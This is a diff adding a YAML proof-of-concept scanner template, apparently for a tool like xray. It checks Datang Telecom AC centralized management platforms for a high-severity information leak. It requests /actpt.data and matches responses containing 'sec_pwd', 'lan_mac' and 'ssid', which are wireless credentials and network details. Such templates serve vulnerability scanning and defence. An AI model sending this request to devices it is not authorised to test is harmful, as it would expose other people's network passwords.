@@ -1,0 +1,14 @@
+id: poc-yaml-datang-ac-centralized-management-platform-sensitive-information-leakage
+info:
+  name: 大唐电信AC集中管理平台 敏感信息泄漏漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: 大唐电信AC集中管理平台
+requests:
+- method: GET
+  path: /actpt.data
+  expression: status_code == 200 && contains(body,"sec_pwd") && contains(body,"lan_mac")
+    && contains(body,"ssid")
+variables: {}
+transport: http
